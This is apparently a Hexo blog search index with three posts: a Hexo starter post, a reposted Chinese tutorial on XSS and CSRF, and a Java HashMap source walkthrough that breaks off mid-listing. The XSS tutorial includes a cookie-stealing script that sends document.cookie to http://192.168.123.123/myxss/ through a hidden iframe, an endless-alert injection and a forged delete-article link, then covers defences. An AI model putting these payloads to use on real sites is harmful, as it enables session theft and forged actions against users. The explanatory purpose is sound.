<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS与CSRF</title>
      <link href="/xss-and-csrf/"/>
      <url>/xss-and-csrf/</url>
      
        <content type="html"><![CDATA[<p><em>以下内容全部来自于转载</em></p><h2 id="xss和csrf的介绍"><a class="markdownIt-Anchor" href="#xss和csrf的介绍"></a> XSS和CSRF的介绍</h2><p>XSS：通过客户端脚本语言（最常见是JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那就叫做XSS！</p><p>CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）完成一些违背用户意愿的请求（如恶意发帖、删帖、改密码、发邮件等）。</p><p>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。</p><p>XSS更偏向与代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</p><p>场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    alert(<span class="string">'你关不掉我'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗。<br />那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>此段代码携带着cookie信息传输给了不安全的服务器，然后服务器接受到了用户的隐私消息，继而继续做其他的业务处理。</p><p>这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。</p><p>那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：</p><p>一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 <a href="http://csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; 那么，我只需要在论坛中发一帖，包含一链接：<a href="http://www.csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">www.csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！</p><h2 id="xss与csrf的防范"><a class="markdownIt-Anchor" href="#xss与csrf的防范"></a> XSS与CSRF的防范</h2><p>CSRF依赖于XSS，防住XSS基本也就防住了CSRF让我们明确我们的目的，其实就是不让用户踏入XSS的坑，那我们有两个方法防止用户入坑，一个是对外部输入进行彻彻底底的敏感字符过滤，一个是在显示的时候做一些特殊处理不让敏感代码顺利执行。前者主要由前端与后端合力完成，后者的话通常就是由前端单独去完成的。</p><p>理论上只要有输入数据入口的地方，XSS漏洞就会存在，js代码可以由各种各样的模式注入到数据库中（明文或者编码），所以在中小项目中我们先明确一个意识即可，我们开发人员要有安全处理的意识，不求百分百的过滤掉非法字符，但是基本的，常见的过滤掉即可，剩下的就交给安全工程师去做吧。</p><p>中心思想：一切的一切外部来源数据，毕竟经过我们服务端代码的过滤，才能让他展示到页面上，也就是说，一切外部数据都是非法的，一定要做好过滤，尤其是WEB端。（毕竟各种js防不胜防）。</p><p><strong>通用的补充性防御手段</strong></p><ol><li><p>在输出html时，加上Content Security Policy的Http Header<br><br />作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等<br><br />缺陷：IE或低版本的浏览器可能不支持</p></li><li><p>在设置Cookie时，加上HttpOnly参数<br><br />作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6<br><br />缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全</p></li><li><p>在开发API时，检验请求的Referer参数<br><br />作用：可以在一定程度上防止CSRF攻击<br><br />缺陷：IE或低版本的浏览器中，Referer参数可以被伪造</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap实现原理</title>
      <link href="/hashMap/"/>
      <url>/hashMap/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>关注点</th><th>结论</th></tr></thead><tbody><tr><td>是否允许空</td><td>key和value都运行空</td></tr><tr><td>是否允许重复元素</td><td>key重复会覆盖，value允许重复</td></tr><tr><td>是否有序</td><td>无序</td></tr><tr><td>是否线程安全</td><td>非线程安全</td></tr></tbody></table><h2 id="hashmap的数据结构"><a class="markdownIt-Anchor" href="#hashmap的数据结构"></a> HashMap的数据结构</h2><p>在Java语言中，最基本的两种结构就是数组和模拟指针（引用），所有的数据结构都可以使用这两个基本结构来构造。HashMap实际就是一个&quot;链表散列&quot;的数据结构，即数组与链表的结合体。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-fda48f04c751b2e9.jpg" alt="" /></p><p>从上图可以看出，HashMap底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个HashMap的时候，就会初始化一个数组。</p><p>首先看一下HashMap的一个存储单元Node：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = hash;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">"="</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">            V oldValue = value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有上面代码可以看出，Node就是数组中的元素，每个Map.Entry其实就是一个Key-value对，它持有一个指向下一个元素的引用，这就构成了链表。</p><h2 id="功能实现-方法"><a class="markdownIt-Anchor" href="#功能实现-方法"></a> 功能实现-方法</h2><h3 id="确定哈希桶数组索引位置"><a class="markdownIt-Anchor" href="#确定哈希桶数组索引位置"></a> 确定哈希桶数组索引位置</h3><p>不管增加、删除、查找键值对，定位到哈希桶数组的位置都是关键的一步，而定位数组索引的主要方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jdk1.8 &amp; jdk1.7</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">// 第一步：h = key.hashCode() 取hashCode值</span></span><br><span class="line">    <span class="comment">// 第二步：h ^ (h &gt;&gt;&gt; 16)     高位参与运算</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jdk1.7的源码，jdk1.8没有这个方法，但是实现原理一样的</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 第三步: 取模运算</span></span><br><span class="line">     <span class="keyword">return</span> h &amp; (length-<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里Hash算法本质上就是三步：取key的hashCode值、高位运算、取模运算</p><p>对于任意给定的对象，只要它的hashCode()值相同，那么调用hash()方法中所计算得到的hash码总是相同的。我们首先想到就是把hash值对数组长度求模，这样就保证了元素的分布相对比较均匀。但是，求模运算时间耗费较大，所以采用了indexFor()方法来计算该对象应该保存在table数组中的哪个索引处。</p><p>这个方法非常巧妙，它通过h &amp; (table.length - 1)来得到该对象的保存位，而HashMap底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当length总是2的n次方时，h &amp; (length - 1)运算等价于对length取模，也就是h % length，但是&amp;比%具有更高的效率。</p><p>在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。</p><p>如下图，其中n为table的长度。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-24c0db720e2d499f.png" alt="" /></p><h3 id="添加与修改数据"><a class="markdownIt-Anchor" href="#添加与修改数据"></a> 添加与修改数据</h3><p>由于Java8对hashMap底层进行了优化，当链表长度大于8时，转换为红黑树进行处理，因此以下采用了美团点评技术团队的讲解。</p><p>HashMap的put方法执行过程可以通过下图来理解。</p><p>步骤一：判断键值对数组table[i]是否为空或为null，否则执行resize()进行扩容；</p><p>步骤二：根据键值key计算hash值得到插入的数组索引i，如果table[i]==null，直接新建节点添加，转向⑥，如果table[i]不为空，转向③；</p><p>步骤三：判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则转向④，这里的相同指的是hashCode以及equals；</p><p>步骤四：判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值对，否则转向⑤；</p><p>步骤五：遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可；</p><p>步骤六：插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对key的hashCode()做hash</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">// 步骤一：tab为空则创建</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 步骤二: 计算index,并对null进行处理 </span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 步骤三：节点key存在，直接覆盖value</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 步骤四：判断该链为红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 步骤五：该链为链表</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// 链表长度大于8转换为红黑树进行处理</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// key已经存在直接覆盖value</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 步骤六：超过最大容量就扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a class="markdownIt-Anchor" href="#删除数据"></a> 删除数据</h3><p>下面是Java8中删除数据源代码的分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> hash, Object key, Object value, <span class="keyword">boolean</span> matchValue, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, index;</span><br><span class="line">    <span class="comment">// 步骤一：找到要删除数组元素为p</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (p = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt; node = <span class="keyword">null</span>, e; K k; V v;</span><br><span class="line">        <span class="comment">// 步骤二：数组元素p存在，表示要删除的节点node赋为p</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            node = p;</span><br><span class="line">        <span class="comment">// 数组元素p是链表，则将链表的下一个节点赋给节点e</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((e = p.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 步骤三：如果p为红黑树，则调用方法找到要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">// 步骤四：如果为链表，则找到对应要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key ||</span><br><span class="line">                            (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">                        node = e;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果找到要删除的节点node</span></span><br><span class="line">        <span class="keyword">if</span> (node != <span class="keyword">null</span> &amp;&amp; (!matchValue || (v = node.value) == value || (value != <span class="keyword">null</span> &amp;&amp; value.equals(v)))) &#123;</span><br><span class="line">            <span class="comment">// 步骤五：判断此时数组元素的类型，并删除对应的节点node</span></span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(<span class="keyword">this</span>, tab, movable);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node == p)</span><br><span class="line">                tab[index] = node.next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                p.next = node.next;</span><br><span class="line">            ++modCount;</span><br><span class="line">            --size;</span><br><span class="line">            afterNodeRemoval(node);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hashmap的其他相关讲解"><a class="markdownIt-Anchor" href="#hashmap的其他相关讲解"></a> HashMap的其他相关讲解</h2><h3 id="扩容机制"><a class="markdownIt-Anchor" href="#扩容机制"></a> 扩容机制</h3><p>扩容就是重新计算容量，当HashMap中无法容纳更多的元素时，就要扩大数组的长度，以便容纳更多的元素。由于Java中的数组是无法自动扩容的，所以要使用一个新的数组来代替已有的容量小的数组。</p><p>下面我们分析resize()方法的源码，由于Java8引入了红黑树，因此还采用Java7的源码进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 